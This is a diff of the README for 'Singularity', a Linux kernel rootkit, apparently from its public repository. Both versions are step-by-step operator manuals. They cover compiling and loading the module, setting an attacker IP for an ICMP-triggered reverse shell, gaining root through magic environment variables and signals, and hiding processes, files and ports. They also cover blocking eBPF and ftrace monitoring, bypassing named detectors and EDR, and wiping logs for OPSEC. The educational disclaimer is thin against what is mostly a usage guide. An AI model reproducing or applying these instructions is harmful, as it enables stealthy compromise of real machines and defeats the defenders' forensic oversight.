@@ -1,29 +1,71 @@
-# Singularity - Powerful Linux Kernel Rootkit
+# Singularity - Advanced Linux Kernel Rootkit
 
-<img src="https://i.imgur.com/n3U5fsP.jpeg" alt="imgur" width="600"/>
+<img src="https://i.imgur.com/n3U5fsP.jpeg" alt="Singularity Rootkit" width="600"/>
 
+> *"Shall we give forensics a little work?"*
 
-> *"Shall we give forensics a little work?"*  
+**Singularity** is a powerful Linux Kernel Module (LKM) rootkit designed for modern 6.x kernels. It provides comprehensive stealth capabilities through advanced system call hooking via ftrace infrastructure.
 
+**Full Research Article**: [Singularity: A Final Boss Linux Kernel Rootkit](https://blog.kyntra.io/Singularity-A-final-boss-linux-kernel-rootkit)
 
-**Singularity** is a Linux Kernel Module (LKM) rootkit for modern kernels (6x).
-
-Full detailed article: https://blog.kyntra.io/Singularity-A-final-boss-linux-kernel-rootkit
-
-Using singularity for EDR Evasion: https://matheuzsecurity.github.io/hacking/bypassing-elastic/
+**EDR Evasion Case Study**: [Bypassing Elastic EDR with Singularity](https://matheuzsecurity.github.io/hacking/bypassing-elastic/)
 
 ---
 
-## Install
+## What is Singularity?
 
-NOTE: There is no feature to make the module visible again, so once it is loaded, it will be hidden automatically and there is no way to remove it other than restarting the machine (if you have not enabled persistence after reboot).
+Singularity is a sophisticated rootkit that operates at the kernel level, providing:
 
-Before compile the singularity, you need to change the `modules/icmp.c` to your attacker IP.
+- **Process Hiding**: Make any process completely invisible to the system
+- **File & Directory Hiding**: Conceal files using pattern matching
+- **Network Stealth**: Hide TCP/UDP connections and ports
+- **Privilege Escalation**: Multiple methods to gain instant root access
+- **Log Sanitization**: Filter kernel logs and system journals in real-time
+- **Self-Hiding**: Remove itself from module lists and system monitoring
+- **Remote Access**: ICMP-triggered reverse shell with automatic hiding
+- **Anti-Detection**: Block eBPF tools, io_uring operations, and prevent module loading
 
-```
+---
+
+## Features
+
+- Environment-triggered privilege elevation via signals and environment variables
+- Complete process hiding from /proc and monitoring tools
+- Pattern-based filesystem hiding for files and directories
+- Network connection concealment from netstat, ss, and packet analyzers
+- Real-time kernel log filtering for dmesg and journalctl
+- Module self-hiding from lsmod and /sys/module
+- Automatic kernel taint flag normalization
+- BPF syscall interception to prevent eBPF-based detection
+- io_uring protection against asynchronous I/O bypass
+- Prevention of new kernel module loading
+- Log masking for kernel messages and system logs
+- Evasion of standard rootkit detectors (unhide, chkrootkit, rkhunter)
+- Automatic child process tracking and hiding via tracepoint hooks
+- Multi-architecture support (x64 + ia32)
+- Network packet-level filtering with raw socket protection
+- Protection against all file I/O variants (read, write, splice, sendfile, tee, copy_file_range)
+
+---
+
+## Installation
+
+### Prerequisites
+
+- Linux kernel 6.x (tested on 6.8.0-79-generic and 6.12)
+- Kernel headers for your running kernel
+- GCC and Make
+- Root access
+
+### Quick Start
+```bash
 cd /dev/shm
 git clone https://github.com/MatheuZSecurity/Singularity
 cd Singularity
+
+# IMPORTANT: Configure your IP before compiling
+# Edit include/core.h and modules/icmp.c
+
 make
 sudo insmod singularity.ko
 sudo bash scripts/journal.sh
@@ -31,228 +73,386 @@ sudo bash scripts/x.sh
 cd ..
 ```
 
-## Usage features
+### Important Notes
 
-### Hiding process
+⚠️ **The module automatically hides itself after loading**
 
-To hide any process you can use `kill -59 PID`, and it will hide from `/proc/`, `ps`, `top`, and any process viewer, it will also be hidden from commands like `stat` and `ls`.
+⚠️ **There is no unload feature - reboot required to remove**
+
+⚠️ **Test in a VM first - cannot be removed without restarting**
+
+---
+
+## Configuration
+
+### Set Your Server IP
+
+**Edit `include/core.h`:**
+```c
+#define YOUR_SRV_IP "192.168.1.100"  // Change this
+#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }  // IPv6 if needed
+```
+
+**Edit `modules/icmp.c`:**
+```c
+#define SRV_PORT "8081"
+```
+
+### Customize Hidden Patterns
+
+**Edit `include/hiding_directory_def.h`:**
+```c
+static const char *hidden_patterns[] = {
+    "jira",
+    "singularity",
+    "obliviate",
+    "matheuz",
+    "zer0t",
+    "your_pattern_here",
+    NULL
+};
+```
+
+### Change Hidden Port
+
+**Edit `modules/hiding_tcp.c`:**
+```c
+#define PORT 8081  // Your hidden port
+```
+
+### Customize Magic Word
+
+**Edit `modules/become_root.c`:**
+```c
+if (strstr(envs, "MAGIC=mtz")) {  // Change "mtz" to your string
+    rootmagic();
+}
+```
+
+### Change ICMP Magic Sequence
+
+**Edit `modules/icmp.c`:**
+```c
+#define ICMP_MAGIC_SEQ 1337  // Change to your sequence
+```
+
+---
+
+## Usage
+
+### Hide Processes
+```bash
+# Hide current shell
+kill -59 $$
+
+# Hide specific process
+kill -59 <PID>
+```
+
+Process will be invisible to ps, top, htop, /proc, and all monitoring tools. All child processes are automatically tracked and hidden.
 
 <p align="center">
 <img src="https://i.imgur.com/wX2g459.png">
-</p align="center">
+</p>
 
-### Hiding directory / files
+### Hide Files & Directories
 
-To hide any directory or file, you can edit or view the file at `include/hiding_directory_def.h` and create a directory or file with its name, for example using `singularity`.
+Files matching your configured patterns are automatically hidden:
+```bash
+mkdir singularity
+echo "secret" > singularity/data.txt
+
+# Invisible to ls, find, locate
+ls -la | grep singularity
+# (no output)
+
+# But you can still access it
+cat singularity/data.txt
+# secret
+
+# cd is blocked for security
+cd singularity
+# bash: cd: singularity: No such file or directory
+```
 
 <p align="center">
 <img src="https://i.imgur.com/a8eb6KS.png">
-</p align="center">
+</p>
 
-### Become root
+### Become Root
 
-To become root, you can use the magic word, `MAGIC=mtz bash`, to spawn a bash with root.
+**Method 1: Environment Variable**
+```bash
+MAGIC=mtz bash
+id  # uid=0(root)
+```
+
+**Method 2: Signal**
+```bash
+kill -59 $$
+id  # uid=0(root)
+```
 
 <p align="center">
 <img src="https://i.imgur.com/jCoi0LV.png">
-</p align="center">
+</p>
 
-And you can use `kill -59 PID` too for become root.
+### Hide Network Connections
 
-### Hiding port
+Connections on your configured port are automatically hidden:
+```bash
+nc -lvnp 8081
 
-You can open a listening port 8081 and that port will be hidden for `ss`. `netstat`, `lsof` and `/proc/net/*` as well.
+# Invisible to all monitoring
+ss -tulpn | grep 8081        # (no output)
+netstat -tulpn | grep 8081   # (no output)
+lsof -i :8081                # (no output)
+```
+
+Packets are dropped at raw socket level (tpacket_rcv) and hidden from /proc/net/* interfaces.
 
 <p align="center">
 <img src="https://i.imgur.com/WUuLu1q.png">
-</p align="center">
+</p>
 
-### Reverse Shell via ICMP Trigger
+### ICMP Reverse Shell
 
-Singularity includes a hidden reverse shell activated by a magic ICMP packet sent from the attacker's machine.
+Trigger a hidden reverse shell remotely:
 
-1. Configure Target for Reverse Shell
-Before compiling, you MUST configure the IP and port where the reverse shell will connect back.
-
-Edit the file `modules/icmp.c` and modify the following lines with your Listener's IP:
-
-```
-// modules/icmp.c
-#define YOUR_SRV_IP "127.0.0.1" // <--- CHANGE THIS to your Listener IP
-// ...
-```
-2. On attacking machine, set up a listener using `nc` or smth like that on the configured port.
-
-3. Send the Magic Trigger using the `scripts/singularity_icmp_trigger.py` to send the ICMP packet with the magic sequence (1337) to the infected machine.
-
-```
-# Usage: sudo ./scripts/singularity_icmp_trigger.py <TARGET_IP>
-sudo python3 singularity_icmp_trigger.py 192.168.1.100
+**1. Start listener:**
+```bash
+nc -lvnp 8081
 ```
 
-The rootkit will capture the ICMP packet, trigger the spawn_revshell work, and attempt to connect to the configured `YOUR_SRV_IP:SRV_PORT`. The spawned shell process will be automatically hidden.
+**2. Send ICMP trigger:**
+```bash
+sudo python3 scripts/singularity_icmp_trigger.py <target_ip>
+```
+
+**3. Receive root shell** (automatically hidden with all child processes)
 
 <p align="center">
 <img src="https://i.imgur.com/4bmbmwY.png">
-</p align=center">
-
-> **Tested kernels: (**6.8.0-79-generic** and **6.12** only), other kernel versions may not compile or crash, precisely because it was designed for modern 6x kernels. This is a risk you can take, so use it in a VM. You can also modify the code to work on any kernel version you like.**  
-
-## All credits
-
-**Singularity** was created by me (**MatheuZSecurity**) with the goal of challenging myself to create an LKM Rootkit that is as undetectable as possible
-
-- https://www.linkedin.com/in/mathsalves/
-
-Join in **Rootkit Researchers** a community where there are only wizards and people who like rootkits, malware, red teaming, forensics and cyber security in general.
-
-- https://discord.gg/66N5ZQppU7
-
-Some Code is Taken from
-
-- https://github.com/iurjscsi1101500/fuxSocy/tree/main
-
-There are codes that I originally reused from my "Collection of codes focused on Linux rootkits" repository, so 
-**credits to the repo contributors as well.**
-
-- https://github.com/MatheuZSecurity/Rootkit
-
-References for this research
-
-KoviD: https://github.com/carloslack/KoviD
-
-Basilisk: https://github.com/lil-skelly/basilisk
-
+</p>
 
 ---
 
+## Protection Mechanisms
 
-## What Singularity *is*
+### Ftrace Control Protection
 
-Singularity, at a high level:
-
-- Environment-triggered **privilege elevation** (signals/env markers).
-- **Process hiding**: syscall-level filtering of `/proc` and process APIs.
-- **Filesystem hiding**: directory listing and stat filtering by pattern.
-- **Network stealth**: procfs-based `/proc/net/*` filtering and selective packet suppression.
-- **Kernel log sanitization**: read-side filtering for `dmesg`/journal interfaces.
-- **Module-hiding utilities**: sysfs & module-list tampering for reduced visibility.
-- A background routine that **normalizes taint indicators** .
-
-
-## More evasion tips
-
-#### Debugfs
-
-All current LKM rootkits, even open source ones, can be detected via `debugfs` on `/dev/sda3` (example) and this is certainly a problem for us.
-
-1) To prevent any operations performed from being easily detected by forensic tools such as `debugfs`, it is recommended to create hidden files and directories in `/dev/shm`.
-
-This directory is a partition mounted in RAM `(tmpfs)`, meaning it does not use the disk file system. For this reason, debugfs, which works directly with file systems such as ext4, cannot inspect the contents of `/dev/shm`.
-
-2) Additionally, to ensure that files are actually destroyed on disk (if not in tmpfs), use the `shred` command.
-
-Shred overwrites the data before deleting the file, minimizing the chance of recovery, including of inodes that may contain important metadata.
-
-3) If you want to enable persistence after reboot with `load_and_persistence.sh`, **know that the kernel module will also be visible in debugfs and can be found**, so it's up to each person whether they want to use it, if you don't want to use it, just simply use the `make` command and load the module with `sudo insmod singularity.ko`
-
-#### Standard tools
-
-Singularity is able to easily bypass standard tools like **unhide, chkrootkit and rkhunter.**
-
-#### Hidden file/directory
-
-1) You can simply change the name of the hidden pattern in `include/hiding_directory_def.h`, because if posts appear teaching how to detect it by this, you can change the name to whatever you want.
-
-2) You can also enable persistence after reboot, the name will be `singularity.conf`, but it is recommended that you change the name of the LKM/conf file, because if not a simple cat on the conf file in /etc/modules-load.d/ can reveal it to you
-
-3) By default, with the directory name hidden, you cannot access it via `cd` command, it is useful when you need to copy some important file into the directory and then `cat singularity/shadow`, or simply copy a binary or something you want into the directory, and from there you use it without necessarily entering the directory
-
-4) You can edit the filter in `modules/clear_taint_dmesg.c` as much as you want, you can add any log files you want or any file whose name you don't want to be visible (Be very careful with this, because depending on the word being filtered, it can break the system.)
-
-
----
-
-## Hook map
-
-This map shows the main hooks.
-
+All attempts to disable ftrace are silently intercepted and blocked:
+```bash
+echo 0 > /proc/sys/kernel/ftrace_enabled       # Appears successful but does nothing
 ```
 
-                            Rootkit Researchers
-                         +-----------------------+
-                         |   Userland Programs   |
-                         | (shells, tools, apps) |
-                         +-----------------------+
-                                    |
-                       Hooked syscalls & interfaces
-                                    |
-            +--------------------------------------------------+
-            |                  ftrace hook core               |
-            |   (centralized hook installer / fh_install)     |
-            +--------------------------------------------------+
-            /     |         |         |         |        |     \
-           /      |         |         |         |        |      \
-  +---------+ +-------+ +--------+ +--------+ +------+ +--------+ +------------+
-  | getdents | | stat/ | | open/  | | read/  | | tcp/ | | write/ | | module     |
-  | hooks    | | statx | | read-  | | read   | |proc/ | | hooks  | | hooks      |
-  | (hiding  | | hooks | | link   | | hooks  | |hooks | |(ftrace| |(insmod /   |
-  | _directory,| (_stat)| (_readlink)| (clear_) |(hiding)| control)| | hide_module)|
-  | _getdents)| |      | | hooks  | | taint) | |      | |        | |            |
-  +----+----+ +---+---+ +---+----+ +---+----+ +---+--+ +---+----+ +------+-----+
-       |          |         |          |        |        |             |
-       |          |         |          |        |        |             |
-       |          |         |          |        |        |             |
-  files/dirs   file meta   symlinks   kernel   /proc/net  debug/trace    module list
-  (ls, find)   (stat/statx) (readlink) logs &  networking  interfaces    & sysfs
-                                              dmesg/journal
-                                            (taint masking, filtering)
+Protected syscalls: write, writev, pwrite64, pwritev, pwritev2, sendfile, sendfile64, splice, vmsplice, tee, copy_file_range, io_uring_enter (with intelligent per-PID caching)
+
+### BPF Syscall Blocking
+
+eBPF operations are intercepted and blocked:
+- BPF_PROG_LOAD (tracepoint, kprobe, tracing, LSM, ext types)
+- BPF_ITER_CREATE, BPF_PROG_GET_NEXT_ID, BPF_MAP_GET_NEXT_ID
+- BPF_RAW_TRACEPOINT_OPEN, BPF_LINK_CREATE
+- BPF_PROG_QUERY, BPF_OBJ_GET_INFO_BY_FD
+- All BPF operations from hidden PIDs
+
+### io_uring Protection
+
+Protection against io_uring bypass in ftrace_enabled and tracing_on attempts with intelligent caching (1 second cache per PID to prevent repeated process scanning and reduce overhead)
+
+### Log Sanitization
+
+Real-time filtering of sensitive strings from kernel and system logs:
+- /proc/kmsg
+- /sys/kernel/debug/tracing/*
+- /var/log/kern.log, syslog, auth.log
+- /proc/vmallocinfo, /proc/kallsyms, /proc/kcore
+- Scheduler debug output (sched_debug_show)
+
+Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate
+
+### Process Hiding Implementation
+
+Complete hiding from syscalls and kernel interfaces:
+- /proc/[pid]/* (openat, readlinkat blocked)
+- getdents, getdents64 (directory listing filtered)
+- stat, lstat, statx, newfstatat (metadata hidden)
+- kill with signal 0 (returns ESRCH)
+- getsid, getpgid, getpgrp (returns ESRCH)
+- sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval (returns ESRCH)
+- getpriority (returns ESRCH)
+- sysinfo (process count adjusted)
+
+Child processes automatically tracked via sched_process_fork tracepoint hook.
+
+---
+
+## Bypassed Security Tools
+
+**Process Monitoring**: ps, top, htop, etc
+
+**Filesystem**: ls, find, locate, stat, lstat, readlink, debugfs (when using /dev/shm)
+
+**Network**: netstat, ss, lsof, tcpdump, wireshark, /proc/net/*
+
+**Logs & Traces**: dmesg, journalctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf
+
+**Rootkit Detectors**: unhide, chkrootkit, rkhunter
+
+**Module Detection**: lsmod, modinfo, /sys/module, /proc/modules, kmod
+
+**Modern Detection**: eBPF-based security tools (Tracee), io_uring-based monitors
+
+---
+
+## Evasion Techniques
+
+### Use tmpfs for Operations
+```bash
+cd /dev/shm
+mkdir singularity
+# Work here - invisible to debugfs disk analysis
 ```
 
+### Secure File Deletion
+```bash
+shred -vfz -n 10 sensitive_file
+rm -f sensitive_file
+```
+
+### Customize All Indicators
+
+Change all default values to avoid signature-based detection:
+
+**Patterns:**
+```c
+static const char *hidden_patterns[] = {
+    "random_xyz_unique_string",
+    NULL
+};
+```
+
+**Other customizations:**
+- Magic word: `MAGIC=your_unique_string`
+- ICMP sequence: `#define ICMP_MAGIC_SEQ 31337`
+- Port: `#define PORT 54321`
+- Thread name: `#define RESET_THREAD_NAME "systemd_worker"`
+- Process name: `#define PROC_NAME "kworker/0:1"`
+
+### Persistence (Use it if you want, but be aware of the risk)
+
+Don't use `load_and_persistence.sh` for stealth operations - module becomes visible in filesystem and can be detected by debugfs disk analysis. Load manually each session: `sudo insmod singularity.ko`
+
+### More OPSEC
+
+1. Always work in /dev/shm (tmpfs)
+2. Use unique, random names for everything
+3. Clean journal logs after operations: `sudo bash scripts/journal.sh` (can be detected via audit logs, so be careful, this will be resolved in future updates to Singularity)
+4. Remove all traces: `sudo bash scripts/x.sh`
+5. Customize all default strings before compilation
+6. Use non-standard ports and sequences
+
 ---
 
-## Hook reference
+## Syscall Hooks
 
-| Functions / Syscall | Module (file) | Short purpose |
-|---|---:|---|
-| `getdents` / `getdents64` | `modules/hiding_directory.c` | Filter directory entries by pattern & hide PIDs. |
-| `stat` / `statx` | `modules/hiding_stat.c` | Alter file metadata returned to userland; adjust `nlink`. |
-| `openat` / `readlinkat` | `modules/open.c`, `modules/hiding_readlink.c` | Return `ENOENT` for hidden paths / proc pids. |
-| `chdir` | `modules/hiding_chdir.c` | Block navigation into hidden paths. |
-| `read` (64/compat) | `modules/clear_taint_dmesg.c` | Filter kernel log reads (kmsg, journal) and remove tagged lines. |
-| `/proc/net` seqfile exports | `modules/hiding_tcp.c` | Filter TCP/UDP entries to hide a configured port; drop packets selectively. |
-| `write` syscalls | `modules/hooks_write.c` | Suppress writes to tracing controls like `ftrace_enabled`, `tracing_on`. |
-| `init_module` / `finit_module` | `modules/hooking_insmod.c` | Block native module insert attempts / syscall paths for insmod (optional). |
-| Module list / sysfs manipulation | `modules/hide_module.c` | Remove kobject entries and unlink module from list. |
-| Kernel taint mask (kprobe) | `modules/reset_tainted.c` | Locate tainted_mask and periodically normalize it . |
-| Credential manipulation | `modules/become_root.c` | Privilege escalation triggers. |
-| Hook installer | `ftrace/ftrace_helper.c` | Abstraction used to install ftrace-based hooks across modules. |
+| Syscall/Function | Module | Purpose |
+|---------|--------|---------|
+| getdents, getdents64 | hiding_directory.c | Filter directory entries, hide PIDs |
+| stat, lstat, newstat, newlstat, statx, newfstatat | hiding_stat.c | Hide file metadata, adjust nlink |
+| openat | open.c | Block access to hidden /proc/[pid] |
+| readlinkat | hiding_readlink.c | Block symlink resolution |
+| chdir | hiding_chdir.c | Prevent cd into hidden dirs |
+| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs |
+| sched_debug_show | clear_taint_dmesg.c | Filter scheduler debug |
+| write, writev, pwrite64, pwritev, sendfile, sendfile64, copy_file_range, splice, vmsplice, tee | hooks_write.c | Block ftrace/tracing control |
+| io_uring_enter | hooks_write.c | Block async I/O bypass |
+| kill, getuid | become_root.c | Root trigger + magic env detection |
+| getsid, getpgid, getpgrp, sched_*, sysinfo | become_root.c | Hide PID queries |
+| getpriority | hiding_stat.c | Hide priority queries |
+| tcp4_seq_show, tcp6_seq_show, tpacket_rcv | hiding_tcp.c | Hide network connections |
+| bpf | bpf_hook.c | Block eBPF tools |
+| init_module, finit_module | hooking_insmod.c | Prevent module loading |
+| icmp_rcv | icmp.c | ICMP-triggered reverse shell |
+| module_hide_current | hide_module.c | Remove from lists/sysfs |
+| sched_process_fork (tracepoint) | trace.c | Track child processes |
+| tainted_mask (kthread) | reset_tainted.c | Clear kernel taint flags |
 
+**Multi-Architecture Support**: x86_64 (`__x64_sys_*`) and ia32 (`__ia32_sys_*`, `__ia32_compat_sys_*`)
 
 ---
 
-## Plot
+## Compatibility
+
+**Tested on**: Kernel 6.8.0-79-generic ✅ | Kernel 6.12 ✅
+
+**Architecture**: x86_64 (primary) | ia32 (full support)
+
+**May not work on**: Kernels < 6.x | Kernels without ftrace support
+
+⚠️ **Always test in a VM first**
+
+---
+
+## The Plot
 
 Unfortunately for some...
 
-Even with all these filters, protections, and hooks, there are still ways to detect this rootkit. 
+Even with all these filters, protections, and hooks, there are still ways to detect this rootkit.
 
-But if you're a good forensic, DFIR, or malware analyst, I'll let you figure it out on your own. 
+But if you're a good forensic analyst, DFIR professional, or malware researcher, I'll let you figure it out on your own.
 
 I won't patch for this, because it will be much more OP ;)
 
+---
+
+## Credits
+
+**Singularity** was created by **MatheuZSecurity** (Matheus Alves)
+
+- LinkedIn: [mathsalves](https://www.linkedin.com/in/mathsalves/)
+- Discord: `kprobe`
+
+**Join Rootkit Researchers**: Discord - [https://discord.gg/66N5ZQppU7](https://discord.gg/66N5ZQppU7)
+
+### Code References
+
+- [fuxSocy](https://github.com/iurjscsi1101500/fuxSocy/tree/main)
+- [MatheuZSecurity/Rootkit](https://github.com/MatheuZSecurity/Rootkit)
+
+### Research Inspiration
+
+- [KoviD](https://github.com/carloslack/KoviD)
+- [Basilisk](https://github.com/lil-skelly/basilisk)
 
 ---
-## Contribution and Bugs
 
-Feel free to make pull requests and contribute to the project. Any errors with Singularity, please create an issue and report it to us.
+## Contributing
 
-Any bug found, if you want, open a issue or contact me via discord: `kprobe`
+- Submit pull requests for improvements
+- Report bugs via GitHub issues
+- Suggest new evasion techniques
+- Share detection methods (for research)
+
+**Found a bug?** Open an issue or contact me on Discord: `kprobe`
 
 ---
 
 ## Disclaimer
 
-This code was developed solely for educational purposes, research, and controlled demonstrations of evasion techniques. Any use outside authorized environments, or for malicious purposes, is strictly prohibited and entirely the responsibility of the user. Unauthorized or illegal use may violate local, national, or international laws.
+⚠️ **FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
 
+This tool is provided solely for educational purposes and learning.
 
+Use responsibly. Test only on systems you own or have explicit permission to test.
+
+---
+
+## License
+
+GPL-3.0 License - See LICENSE file for details
+
+**Created by MatheuZSecurity**
+
+> "More love and less war"
